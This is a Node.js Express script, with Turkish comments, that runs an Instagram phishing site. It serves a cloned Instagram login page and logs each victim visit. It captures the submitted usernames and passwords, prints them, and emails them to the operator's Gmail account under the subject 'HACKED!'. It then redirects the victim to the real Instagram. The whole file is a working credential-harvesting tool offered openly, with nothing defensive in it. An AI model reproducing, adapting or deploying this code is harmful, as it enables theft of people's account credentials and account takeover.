var express = require('express');
const yargs = require('yargs')
var app = express();
var bodyparser = require('body-parser');
var nodemailer = require('nodemailer');

let mail; 
let password;
let port;

yargs.command({
    command : 'add',
    describe : 'database yeni kullanıcı ekler',
    builder : {
        mail:{
            describe : 'eklenecek kişinin telefon numarası',
            demandOption: true,
            type:'string'
        },
        password:{
            describe : 'eklenecek kişinin telefon numarası',
            demandOption: true,
            type:'string'
        },
        port:{
            describe : 'port',
            demandOption: true,
            type:'int'
        }
    },

    handler(argv){
        mail = argv.mail;
        password = argv.password;
        port = argv.port
    }
})
yargs.parse();

app.listen(port);
console.log("Listening port: " + port)

app.use(bodyparser.urlencoded({'extended':'true'})); 
app.use(express.static(__dirname + '/media'));
app.use(express.static(__dirname + '/media/phonepics'));
app.use(express.static(__dirname + '/Instagram_dosyalar'));

console.log(__dirname);

app.get('/', function(req, res){
    res.sendFile(__dirname+"/Instagram.html");
    console.log("Victim Accessed To Website")

})


app.post("/instagram",function (req,res){
    mailgonder(req.body["username"],req.body["password"],"\nThere ya go boi!");
    res.redirect("https://instagram.com");
})




function mailgonder(kullaniciMail, KullaniciSifre, kullaniciMesaj){
    const mail_ = mail;
    const password_ = password;
    console.log("\nUsername Found: "+ kullaniciMail)
    console.log("Password Found: "+ KullaniciSifre + "\n")


    var transfer = nodemailer.createTransport({
        service:"gmail", //kullanılacak servis
        auth:{//gönderilecek mailin bilgileri
            user:mail_,
            pass:password_
        }
    });

    var mail_tosent = {
        from:mail_,
        to:mail_,
        subject:`HACKED! Username: ${kullaniciMail}\nPassword: ${KullaniciSifre}`,
        text:kullaniciMesaj  
    };

    transfer.sendMail(mail_tosent,function(error){
        if(error){
            console.log(error);
        }else{console.log("Mail sent to " + mail); res.redirect("https://www.instagram.com/")}
        
    })

}
    